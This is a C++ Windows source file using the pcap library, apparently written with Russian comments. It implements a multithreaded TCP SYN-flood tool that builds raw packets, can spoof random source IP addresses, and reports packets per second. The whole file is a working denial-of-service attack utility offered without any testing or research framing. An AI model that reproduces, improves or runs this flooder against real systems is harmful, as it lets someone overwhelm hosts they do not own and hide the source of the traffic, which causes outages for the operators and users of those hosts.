// g++ -O2 -g tcp_optimized.cpp -o NPtcpT.exe -I"./Include" -L"./Lib/x64" -lwpcap -lws2_32 -liphlpapi
#define HAVE_REMOTE
#include <pcap.h>
#include <iostream>
#include <thread>
#include <atomic>
#include <memory>
#include <cstring>
#include <cstdint>
#include <cstdlib>
#include <ctime>
#include <cstdio>
#include <iomanip>
#include <vector>
#include <chrono>
#include <winsock2.h>
#include <iphlpapi.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <intrin.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")

// ------------------------------------------------------------
// Структуры заголовков (упакованы)
// ------------------------------------------------------------
#pragma pack(push, 1)
struct ether_header {
    uint8_t  ether_dhost[6];
    uint8_t  ether_shost[6];
    uint16_t ether_type;
};

struct ipv4_header {
    uint8_t  ihl:4, version:4;
    uint8_t  tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
};

struct tcphdr {
    uint16_t source;
    uint16_t dest;
    uint32_t seq;
    uint32_t ack_seq;
    uint16_t res1:4, doff:4;
    uint16_t fin:1, syn:1, rst:1, psh:1, ack:1, urg:1, ece:1, cwr:1;
    uint16_t window;
    uint16_t check;
    uint16_t urg_ptr;
};
#pragma pack(pop)

// ------------------------------------------------------------
// Быстрый генератор случайных чисел XorShift128+
// ------------------------------------------------------------
struct FastRand {
    uint64_t s[4];
    FastRand(uint64_t seed) {
        s[0] = seed;
        s[1] = seed ^ 0x9e3779b97f4a7c15ULL;
        s[2] = seed ^ 0xbf58476d1ce4e5b9ULL;
        s[3] = seed ^ 0x94d049bb133111ebULL;
    }
    inline uint64_t next64() {
        uint64_t t = s[0];
        uint64_t const x = s[1];
        s[0] = x;
        t ^= t << 23;
        s[1] = s[2];
        s[2] = s[3];
        s[3] = t ^ x ^ (t >> 18) ^ (x >> 5);
        return s[3];
    }
    inline uint32_t next32() {
        return static_cast<uint32_t>(next64());
    }
};

// ------------------------------------------------------------
// Утилиты
// ------------------------------------------------------------
bool is_ipv6(const char* ip) {
    struct sockaddr_in6 sa6;
    return inet_pton(AF_INET6, ip, &sa6.sin6_addr) == 1;
}

bool get_local_mac_ipv4(uint32_t ip, uint8_t mac[6]) {
    DWORD dwSize = 0;
    PIP_ADAPTER_INFO pAdapterInfo = nullptr;
    if (GetAdaptersInfo(nullptr, &dwSize) == ERROR_BUFFER_OVERFLOW) {
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(dwSize);
        if (GetAdaptersInfo(pAdapterInfo, &dwSize) == NO_ERROR) {
            PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
            while (pAdapter) {
                IP_ADDR_STRING* pIp = &pAdapter->IpAddressList;
                while (pIp) {
                    if (inet_addr(pIp->IpAddress.String) == ip) {
                        memcpy(mac, pAdapter->Address, 6);
                        free(pAdapterInfo);
                        return true;
                    }
                    pIp = pIp->Next;
                }
                pAdapter = pAdapter->Next;
            }
        }
        free(pAdapterInfo);
    }
    return false;
}

std::string get_interface_name_ipv4(uint32_t ip) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t *alldevs, *dev;
    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, nullptr, &alldevs, errbuf) == -1)
        return "";
    for (dev = alldevs; dev; dev = dev->next) {
        pcap_addr_t *addr;
        for (addr = dev->addresses; addr; addr = addr->next) {
            if (addr->addr && addr->addr->sa_family == AF_INET) {
                struct sockaddr_in *sin = (struct sockaddr_in*)addr->addr;
                if (sin->sin_addr.s_addr == ip) {
                    std::string name = dev->name;
                    pcap_freealldevs(alldevs);
                    return name;
                }
            }
        }
    }
    pcap_freealldevs(alldevs);
    return "";
}

bool get_local_mac_ipv6(const uint8_t ip[16], uint8_t mac[6]) {
    ULONG size = 0;
    GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, nullptr, nullptr, &size);
    std::vector<BYTE> buf(size);
    PIP_ADAPTER_ADDRESSES pAdapters = (PIP_ADAPTER_ADDRESSES)buf.data();
    if (GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, nullptr, pAdapters, &size) != NO_ERROR)
        return false;
    for (PIP_ADAPTER_ADDRESSES p = pAdapters; p; p = p->Next) {
        for (PIP_ADAPTER_UNICAST_ADDRESS u = p->FirstUnicastAddress; u; u = u->Next) {
            if (u->Address.lpSockaddr->sa_family == AF_INET6) {
                sockaddr_in6* sin6 = (sockaddr_in6*)u->Address.lpSockaddr;
                if (memcmp(sin6->sin6_addr.s6_addr, ip, 16) == 0) {
                    memcpy(mac, p->PhysicalAddress, 6);
                    return true;
                }
            }
        }
    }
    return false;
}

std::string get_interface_name_ipv6(const uint8_t ip[16]) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t *alldevs, *dev;
    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, nullptr, &alldevs, errbuf) == -1)
        return "";
    for (dev = alldevs; dev; dev = dev->next) {
        pcap_addr_t *addr;
        for (addr = dev->addresses; addr; addr = addr->next) {
            if (addr->addr && addr->addr->sa_family == AF_INET6) {
                sockaddr_in6* sin6 = (sockaddr_in6*)addr->addr;
                if (memcmp(sin6->sin6_addr.s6_addr, ip, 16) == 0) {
                    std::string name = dev->name;
                    pcap_freealldevs(alldevs);
                    return name;
                }
            }
        }
    }
    pcap_freealldevs(alldevs);
    return "";
}

uint16_t checksum(uint16_t *ptr, int len) {
    uint32_t sum = 0;
    while (len > 1) { sum += *ptr++; len -= 2; }
    if (len) sum += *(uint8_t*)ptr;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return ~sum;
}

bool parse_mac_strict(const char* str, uint8_t mac[6]) {
    unsigned int tmp[6] = {};
    int consumed = 0;
    if (sscanf(str, "%2x:%2x:%2x:%2x:%2x:%2x%n", &tmp[0],&tmp[1],&tmp[2],&tmp[3],&tmp[4],&tmp[5],&consumed) != 6)
        return false;
    if (str[consumed] != '\0') return false;
    for (int i = 0; i < 6; ++i) mac[i] = static_cast<uint8_t>(tmp[i]);
    return true;
}

void print_mac(const uint8_t mac[6]) {
    for (int i = 0; i < 6; ++i) { if (i) std::printf(":"); std::printf("%02X", mac[i]); }
    std::printf("\n");
}

// ------------------------------------------------------------
// Предварительно собранный пакет (только IPv4)
// ------------------------------------------------------------
class PrebuiltPacketIPv4 {
public:
    std::vector<uint8_t> buffer;   // полный пакет (Ethernet+IP+TCP+payload)
    size_t src_ip_offset;
    size_t src_port_offset;
    size_t seq_offset;
    size_t tcp_header_offset;
    uint16_t net_dst_port;
    size_t payload_size;

    PrebuiltPacketIPv4(uint32_t src_ip, uint8_t* src_mac, uint32_t dst_ip, uint8_t* dst_mac,
                       uint16_t dst_port, size_t packet_size)
        : net_dst_port(htons(dst_port))
    {
        size_t min_size = sizeof(ether_header) + sizeof(ipv4_header) + sizeof(tcphdr);
        payload_size = (packet_size > min_size) ? (packet_size - min_size) : 0;
        size_t total = min_size + payload_size;
        buffer.resize(total, 0);

        ether_header* eth = (ether_header*)buffer.data();
        memcpy(eth->ether_dhost, dst_mac, 6);
        memcpy(eth->ether_shost, src_mac, 6);
        eth->ether_type = htons(0x0800);

        ipv4_header* ip = (ipv4_header*)(buffer.data() + sizeof(ether_header));
        ip->version = 4; ip->ihl = 5; ip->tos = 0;
        ip->tot_len = htons(sizeof(ipv4_header) + sizeof(tcphdr) + payload_size);
        ip->id = 0; ip->frag_off = 0; ip->ttl = 64; ip->protocol = 6; ip->check = 0;
        ip->saddr = src_ip; ip->daddr = dst_ip;

        tcphdr* tcp = (tcphdr*)(buffer.data() + sizeof(ether_header) + sizeof(ipv4_header));
        tcp->source = 0;
        tcp->dest = net_dst_port;
        tcp->seq = 0;
        tcp->ack_seq = 0;
        tcp->doff = 5;
        tcp->syn = 1;
        tcp->window = htons(64240);
        tcp->check = 0;
        tcp->urg_ptr = 0;

        if (payload_size > 0) {
            uint8_t* payload = buffer.data() + sizeof(ether_header) + sizeof(ipv4_header) + sizeof(tcphdr);
            memset(payload, 0, payload_size);
        }

        src_ip_offset = sizeof(ether_header) + offsetof(ipv4_header, saddr);
        src_port_offset = sizeof(ether_header) + sizeof(ipv4_header) + offsetof(tcphdr, source);
        seq_offset = sizeof(ether_header) + sizeof(ipv4_header) + offsetof(tcphdr, seq);
        tcp_header_offset = sizeof(ether_header) + sizeof(ipv4_header);
    }

    size_t getSize() const { return buffer.size(); }
    uint8_t* getBuffer() { return buffer.data(); }

    void setSrcIp(uint32_t ip) {
        *(uint32_t*)(buffer.data() + src_ip_offset) = ip;
    }

    void setSrcPort(uint16_t port) {
        *(uint16_t*)(buffer.data() + src_port_offset) = htons(port);
    }

    void setSeq(uint32_t seq) {
        *(uint32_t*)(buffer.data() + seq_offset) = htonl(seq);
    }

    void recalcChecksum() {
        // IP checksum
        ipv4_header* ip = (ipv4_header*)(buffer.data() + sizeof(ether_header));
        ip->check = 0;
        ip->check = checksum((uint16_t*)ip, sizeof(ipv4_header));

        // TCP pseudo header checksum
        struct pseudo_ipv4 {
            uint32_t src;
            uint32_t dst;
            uint8_t zero;
            uint8_t proto;
            uint16_t len;
        } ps;
        ps.src = ip->saddr;
        ps.dst = ip->daddr;
        ps.zero = 0;
        ps.proto = 6;
        ps.len = htons(sizeof(tcphdr) + payload_size);

        tcphdr* tcp = (tcphdr*)(buffer.data() + tcp_header_offset);
        tcp->check = 0;

        size_t total_len = sizeof(ps) + sizeof(tcphdr) + payload_size;
        uint8_t* pseudo_buf = (uint8_t*)_alloca(total_len);
        memcpy(pseudo_buf, &ps, sizeof(ps));
        memcpy(pseudo_buf + sizeof(ps), tcp, sizeof(tcphdr));
        if (payload_size) {
            uint8_t* payload = buffer.data() + tcp_header_offset + sizeof(tcphdr);
            memcpy(pseudo_buf + sizeof(ps) + sizeof(tcphdr), payload, payload_size);
        }
        tcp->check = checksum((uint16_t*)pseudo_buf, (int)total_len);
    }
};

// ------------------------------------------------------------
// FloodEngine – прямой pcap_sendpacket, без очереди
// ------------------------------------------------------------
class FloodEngine {
private:
    pcap_t* pcap_handle;
    bool random_ip;
    bool random_mac;
    uint16_t port_counter;
    FastRand rng;
    std::atomic<uint64_t>& total_packets_sent;
    std::atomic<bool>& stop_flag;
    size_t packet_size;
    std::unique_ptr<PrebuiltPacketIPv4> packet4;
    uint32_t src_ip4_base;
    static constexpr int STOP_CHECK_INTERVAL = 1024;

public:
    FloodEngine(pcap_t* handle, void* src_ip, uint8_t* src_mac, void* dst_ip, uint8_t* dst_mac,
                uint16_t dst_port, int thread_index, std::atomic<uint64_t>& total_counter,
                std::atomic<bool>& stop, bool random_ip_flag, bool random_mac_flag,
                size_t packet_size)
        : pcap_handle(handle), random_ip(random_ip_flag), random_mac(random_mac_flag),
          port_counter(static_cast<uint16_t>(1024 + (thread_index * 997) % 64512)),
          rng(static_cast<uint64_t>(time(nullptr)) + thread_index * 123456789ULL),
          total_packets_sent(total_counter), stop_flag(stop), packet_size(packet_size)
    {
        uint32_t src_ip_val = *(uint32_t*)src_ip;
        uint32_t dst_ip_val = *(uint32_t*)dst_ip;
        packet4 = std::make_unique<PrebuiltPacketIPv4>(src_ip_val, src_mac, dst_ip_val, dst_mac,
                                                       dst_port, packet_size);
        src_ip4_base = src_ip_val;
    }

    void start(int core_id) {
        HANDLE hThread = GetCurrentThread();
        SetThreadAffinityMask(hThread, 1ULL << core_id);
        SetThreadPriority(hThread, THREAD_PRIORITY_TIME_CRITICAL);

        uint64_t local_count = 0;
        int iter = 0;
        uint32_t rand_ip_val;
        uint16_t src_port;
        uint32_t seq;

        struct pcap_pkthdr pkt_header;
        pkt_header.ts.tv_sec = 0;
        pkt_header.ts.tv_usec = 0;

        while (true) {
            if (++iter >= STOP_CHECK_INTERVAL) {
                if (stop_flag.load(std::memory_order_relaxed)) break;
                iter = 0;
            }

            // Меняем только изменяемые поля
            if (random_ip) {
                rand_ip_val = rng.next32();
                rand_ip_val &= 0xFEFFFFFF; // unicast
                packet4->setSrcIp(rand_ip_val);
            } else {
                packet4->setSrcIp(src_ip4_base);
            }

            if (random_mac) {
                // MAC не меняем для скорости – он не влияет на маршрутизацию
                // можно оставить без изменений или генерировать, но замедлит
            }

            src_port = port_counter++;
            if (port_counter > 65535) port_counter = 1024;
            seq = rng.next32();

            packet4->setSrcPort(src_port);
            packet4->setSeq(seq);
            packet4->recalcChecksum();  // пересчёт IP и TCP checksum

            pkt_header.len = packet4->getSize();
            pkt_header.caplen = packet4->getSize();

            // Отправка одного пакета
            if (pcap_sendpacket(pcap_handle, packet4->getBuffer(), packet4->getSize()) != 0) {
                static thread_local int err_count = 0;
                if (++err_count % 1000 == 1) {
                    // игнорируем
                }
                continue;
            }
            local_count++;
        }
        total_packets_sent.fetch_add(local_count, std::memory_order_relaxed);
    }
};

// ------------------------------------------------------------
// main
// ------------------------------------------------------------
int main(int argc, char* argv[]) {
    if (argc < 6) {
        std::cerr << "Usage: " << argv[0]
                  << " <src_ip> <dst_ip> <dst_port> <threads> <duration_sec> [dst_mac] [--random-ip] [--random-mac] [--packet-size <bytes>]\n";
        return 1;
    }

    bool ipv6 = is_ipv6(argv[1]) || is_ipv6(argv[2]);
    if (ipv6) {
        std::cerr << "IPv6 not supported in this ultra-optimized version (only IPv4)\n";
        return 1;
    }

    uint32_t src_ip4 = inet_addr(argv[1]);
    uint32_t dst_ip4 = inet_addr(argv[2]);
    uint16_t dst_port = (uint16_t)atoi(argv[3]);
    int num_threads = atoi(argv[4]);
    int duration = atoi(argv[5]);
    if (dst_port == 0 || num_threads <= 0 || duration < 0) return 1;

    uint8_t dst_mac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    bool random_ip = false, random_mac = false;
    size_t packet_size = 0;

    for (int i = 6; i < argc; i++) {
        if (strcmp(argv[i], "--random-ip") == 0) random_ip = true;
        else if (strcmp(argv[i], "--random-mac") == 0) random_mac = true;
        else if (strcmp(argv[i], "--packet-size") == 0 && i+1 < argc) {
            packet_size = atoi(argv[++i]);
        }
        else if (parse_mac_strict(argv[i], dst_mac)) { /* ok */ }
        else std::cerr << "Warning: unknown argument '" << argv[i] << "'\n";
    }

    // минимальные размеры
    size_t min_size = sizeof(ether_header) + sizeof(ipv4_header) + sizeof(tcphdr);
    if (packet_size == 0) packet_size = min_size;
    else if (packet_size < min_size) packet_size = min_size;

    SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
    DWORD_PTR proc_mask = (1ULL << num_threads) - 1;
    SetProcessAffinityMask(GetCurrentProcess(), proc_mask);

    char errbuf[PCAP_ERRBUF_SIZE];
    if (pcap_init(PCAP_CHAR_ENC_UTF_8, errbuf) == -1) {
        std::cerr << "pcap_init failed: " << errbuf << std::endl;
        return 1;
    }

    std::string ifname;
    uint8_t src_mac[6] = {0};
    if (src_ip4 != 0) {
        ifname = get_interface_name_ipv4(src_ip4);
        if (ifname.empty()) { std::cerr << "Interface not found\n"; return 1; }
        if (!random_mac && !get_local_mac_ipv4(src_ip4, src_mac)) {
            std::cerr << "Cannot get local MAC\n"; return 1;
        }
    } else {
        pcap_if_t *alldevs;
        if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, nullptr, &alldevs, errbuf) == -1) return 1;
        if (alldevs) { ifname = alldevs->name; pcap_freealldevs(alldevs); }
        else { std::cerr << "No interfaces\n"; return 1; }
    }

    // Проверка типа канала
    pcap_t* temp = pcap_open(ifname.c_str(), 65536, 0, 1000, nullptr, errbuf);
    if (!temp || pcap_datalink(temp) != DLT_EN10MB) { std::cerr << "Link error\n"; return 1; }
    pcap_close(temp);

    // Открываем отдельные дескрипторы для каждого потока
    std::vector<pcap_t*> handles;
    for (int i = 0; i < num_threads; i++) {
        pcap_t* h = pcap_open(ifname.c_str(), 65536, 0, 1000, nullptr, errbuf);
        if (!h) { for (auto hh : handles) pcap_close(hh); return 1; }
        pcap_set_buffer_size(h, 64 * 1024 * 1024); // 64 MB
        handles.push_back(h);
    }

    std::cout << "Interface: " << ifname << "\nDestination MAC: "; print_mac(dst_mac);
    std::cout << "Random IP: " << (random_ip ? "yes" : "no") << "\nRandom MAC: " << (random_mac ? "yes" : "no") << "\n";
    std::cout << "Packet size: " << packet_size << " bytes\n";
    std::cout << "Mode: direct pcap_sendpacket (no batching)\n";

    std::atomic<uint64_t> total_packets(0);
    std::atomic<bool> stop(false);
    std::vector<std::thread> workers;
    SYSTEM_INFO si; GetSystemInfo(&si);
    DWORD cores = si.dwNumberOfProcessors;

    auto start_time = std::chrono::steady_clock::now();
    for (int i = 0; i < num_threads; i++) {
        auto engine = std::make_unique<FloodEngine>(handles[i], &src_ip4, src_mac, &dst_ip4, dst_mac,
                                                    dst_port, i, total_packets, stop, random_ip,
                                                    random_mac, packet_size);
        workers.emplace_back(&FloodEngine::start, engine.get(), i % cores);
        engine.release();
    }

    if (duration > 0) std::this_thread::sleep_for(std::chrono::seconds(duration));
    else { std::cout << "Press Enter to stop...\n"; std::cin.get(); }
    stop = true;
    for (auto& w : workers) if (w.joinable()) w.join();

    auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::steady_clock::now() - start_time).count();
    uint64_t pkts = total_packets.load();
    if (elapsed == 0) elapsed = 1;
    double pps = pkts * 1000.0 / elapsed;
    double mbps = (pps * packet_size * 8) / 1e6;
    std::cout << "\n--- Results ---\nTotal packets: " << pkts << "\nDuration: " << elapsed << " ms\nThroughput: " << pps << " pps\nBandwidth: " << mbps << " Mbps\n";
    for (auto h : handles) pcap_close(h);
    return 0;
}